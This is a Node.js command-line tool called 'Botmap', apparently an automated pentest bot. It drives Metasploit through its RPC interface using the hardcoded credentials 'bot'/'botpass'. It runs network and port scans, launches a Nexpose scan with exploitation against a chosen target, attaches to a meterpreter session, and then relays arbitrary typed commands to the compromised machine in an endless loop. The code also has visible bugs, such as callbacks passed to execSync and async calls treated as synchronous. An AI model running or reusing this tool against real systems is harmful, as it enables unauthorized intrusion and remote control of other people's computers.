#! /usr/bin/env node
'use strict';

var _msfnode = require('msfnode');

var _msfnode2 = _interopRequireDefault(_msfnode);

var _shellTask = require('shell-task');

var _shellTask2 = _interopRequireDefault(_shellTask);

var _child_process = require('child_process');

var _safe = require('colors/safe');

var _safe2 = _interopRequireDefault(_safe);

var _promptSync = require('prompt-sync');

var _promptSync2 = _interopRequireDefault(_promptSync);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

var client = new _msfnode2.default({
  login: 'bot',
  password: 'botpass'
});

var version = 'BETA 0.3.0';

//set theme
_safe2.default.setTheme({
  silly: 'rainbow',
  input: 'grey',
  verbose: 'cyan',
  prompt: 'grey',
  info: 'green',
  data: 'grey',
  help: 'cyan',
  warn: 'yellow',
  debug: 'blue',
  error: 'red'
});

//make sure that the user know what he's doing
function userAuth() {
  console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
  console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
  console.log(_safe2.default.prompt('Press "y" to continue | "n" to stop!'));
  var input = _promptSync2.default.prompt();

  if (input != 'y') {
    console.log(_safe2.default.info('Maybe a wise decision..'));
    process.exit(0);
  }
}

client.on('connected', onConnect);

//do this on connect
function onConnect(err, token) {
  if (err) {
    console.error(_safe2.default.error('Could not connect \n' + err));
    process.exit(1);
  } else {
    userInteraction();
    console.log(_safe2.default.info('connected'));
  }
}
//create console fx
function startConsole() {
  console.log(_safe2.default.info('Opening a console... '));
  var id = '';
  var args = ['console.create'];
  id = client.exec(args, function (err, r) {
    if (err) {
      console.error(_safe2.default.error('Could not open a new console \n' + err));
    } else {
      console.log(_safe2.default.info('Console opened, cleaning it... \n'));

      client.exec(['console.read'], function (err, r) {
        if (err) {
          console.error(_safe2.default.error('Could not open a new Console...' + err));
          process.exit;
        }
        console.log(_safe2.default.info('Done !'));
        console.log(_safe2.default.info('Returning to usermenu...'));
      });
    }
  });
  return id;
}

/* --- SERVER FUNCTIONS
function startServer() {
  console.log(c.info('Starting server ! '))
  execSync('msfrpcd -U bot -P botpass -f ', (err, stdout, stderr) => {
    if(err || stderr) {
    const error = err || stderr
    console.error(c.error('Could not start server \n' + error ))
   } else {
     console.log(c.info('started server'))
   }
  })
}

function stopServer() {
  client.exec('core.stop', (err, r) => {
    if(err) {
      console.error(c.error('Could not stop server ! \n ' + err))
    } else {
      console.log(c.info('server halted'))
    }
  })
}
*/
/* ---- END SERVER FUNCTIONS | SETUP FUNCTIONS ---- */
//add workspace fx
function workspace(console_id) {
  console.log(_safe2.default.info('Adding workspace...'));
  var args = ['console.write', console_id, 'workspace -a botmap\n']; //format console.write,id,[command,arguments +\n]
  client.exec(args, function (err, r) {
    if (err) {
      console.error(_safe2.default.error('Could not add workspace \n' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('workspace added'));
    }
  });
}

//switch workspace fx
function switchWorkspace(console_id) {
  console.log(_safe2.default.info('Switching workspace...'));
  client.exec(['console.write', console_id, 'workspace botmap\n'], function (err, r) {
    if (err) {
      console.error(_safe2.default.error('Could not switch workspace \ n' + err));
    } else {
      console.log(_safe2.default.info('workspace switched'));
    }
  });
}

/* ---- END SETUP FUNCTIONS | EXPLOIT FUNCTIONS ---- */

function macScan(target) {
  (0, _child_process.execSync)('arp-scan -l -I', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('An error occured \n' + error));
    } else {
      console.log(stdout);
    }
  });
}

function portScan(target, console_id) {
  var args = ['console.write', console_id, 'db_nmap -sS -n' + target + '\n'];
  client.exec(args, function (err, r) {
    if (err) {
      console.error(_safe2.default.error('Could not scan target [' + target + ']' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('performed scan'));
      var _args = ['console.read', console_id];
      client.exec(_args, function (err, res) {
        if (err) {
          console.error(_safe2.default.error('Could not read data ! \n' + err));
          process.exit(1);
        } else {
          console.log(res);
        }
      });
    }
  });
}

function generalScan(target, console_id) {
  var args = ['console.write', console_id, 'db_nmap -sS -sV -sU -n -O' + target + '\n'];
  client.exec(args, function (err, r) {
    if (err) {
      console.error(_safe2.default.error('Could not scan target [' + target + ']' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('performed scan'));
      var _args2 = ['console.read', console_id];
      client.exec(_args2, function (err, res) {
        if (err) {
          console.error(_safe2.default.error('Could not read data ! \n' + err));
          process.exit(1);
        } else {
          console.log(res);
        }
      });
    }
  });
}

function exploit(target, console_id) {
  console.log(_safe2.default.info('starting scan... \n loading nexpose module'));
  //load nexpose
  console.log(_safe2.default.info('loading nexpose...'));
  var args = ['console.write', console_id, 'load nexpose'];
  client.exec(args, function (err, res) {
    if (err) {
      console.error(_safe2.default.error('Could not load nexpose module ! \n ' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Done ! '));
    }
  });
  //start full nexpose audit
  console.log(_safe2.default.info('logging in to nexpose...'));
  args = ['console.write', console_id, 'nexpose_connect bot:botpass@127.0.0.1'];
  client.exec(args, function (err, res) {
    if (err) {
      console.error(_safe2.default.err('Could not log in to local nexpose service !' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Done !'));
    }
  });
  //start scan
  console.log(_safe2.default.info('Starting actual scan now... '));
  args = ['console.write', console_id, 'nexpose_scan -x' + target];
  client.exec(args, function (err, res) {
    if (err) {
      console.error(_safe2.default.error('Could not scan' + target + '\n' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Done ! '));
    }
  });
  //meterpreter if possible
  console.log(_safe2.default.info('Trying to connect using meterpreter...'));
  args = ['console.write', console_id, 'sessions -i 1'];
  client.exec(args, function (err, res) {
    if (err) {
      console.error(_safe2.default.error('Could not connect to target [' + target + '] \n' + err));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Looks like botmap was able to connect ! \n' + res));
    }
  });
  args = ['console.read', console_id];
  client.exec(args, function (err, res) {
    if (err) {
      console.error(_safe2.default.error('An error occured \n' + err));
    } else {
      console.log(res);
    }
  });
  console.log(_safe2.default.info('Now entering prompt-execute loop \n You should have full access to the target machine ! \n Type botmap-exit to exit the loop !'));
  while (true) {
    var remoteCommand = _promptSync2.default.prompt();
    if (remoteCommand == 'botmap-exit') {
      console.log(_safe2.default.info('Starting disconnection process...'));
      client.exec('core.stop', function (err, res) {
        if (err) {
          console.err(_safe2.default.error('Could not stop \n' + err));
        } else {
          console.log(_safe2.default.info('Everything has been shutdown ! Have a nice day =]'));
        }
      });
      return false;
    }
    args = ['console.write', console_id, remoteCommand];
    client.exec(args, function (err, res) {
      if (err) {
        console.error(_safe2.default.error('An error occured: \n ' + err));
      }
    });
    args = ['console.read', console_id];
    client.exec(args, function (err, res) {
      if (err) {
        console.error(_safe2.default.error('An error occured \n' + err));
      } else {
        console.log(res);
      }
    });
  }
}

/* ---- END EXPLOIT FUNCTIONS | USER MENU ---- */
function userInteraction() {
  var userArgs = process.argv.slice(2);

  var client = new _msfnode2.default({
    login: 'bot',
    password: 'botpass'
  });
  if (userArgs[0] == 'target' || userArgs[0] == '-t') {
    var id = startConsole();
    startConsole();
    switchWorkspace(id);
    exploit(userArgs[1], id);
  } else if (userArgs[0] == 'about' || userArgs[0] == '-a') {
    console.log(_safe2.default.info('-----------------------------------------------------------------'));
    console.log(_safe2.default.info('Botmap, a pentest bot ! '));
    console.log(_safe2.default.info('Author: Coretool'));
    console.log(_safe2.default.info('License: MIT '));
    console.log(_safe2.default.info('Note that I am not responsible for what you do with botmap'));
    console.log(_safe2.default.info('Visit github.com/coretool/botmap for more !'));
    console.log(_safe2.default.info('-----------------------------------------------------------------'));
  } else if (userArgs[0] == 'help' || userArgs[0] == '-h') {
    console.log('Help screen goes here'); //to do add help
  } else if (userArgs[0] == 'setup' || userArgs[0] == '-s') {
      console.log(_safe2.default.info('Seeting up botmap ! \n Note that you only have to use this once per release'));
      var id = startConsole();
      (0, _child_process.execSync)('clear'); //just to get rid of the ugly text
      workspace(id);
      console.log(_safe2.default.info('Done ! '));
    } else if (userArgs[0] == 'scan' && userArgs[1] == 'mac') {
      console.log(_safe2.default.info('Mac address scan...'));
      macScan(userArgs[2]);
      console.log(_safe2.default.info('Done !'));
    } else if (userArgs[0] == 'scan' && userArgs[1] == 'port') {
      console.log(_safe2.default.info('Port scan...'));
      var id = startConsole();
      startConsole();
      switchWorkspace(id);
      portScan(userArgs[2], id);
      console.log(_safe2.default.info('Done ! '));
    } else if (userArgs[0] == 'scan' && userArgs[1] == 'general') {
      console.log(_safe2.default.info('General scan...'));
      var id = startConsole();
      startConsole();
      switchWorkspace(id);
      generalScan(userArgs[2], id);
    } else {
      console.log(_safe2.default.help('Botmap version: ' + version + ' use "botmap -h" for the help menu'));
    }
}
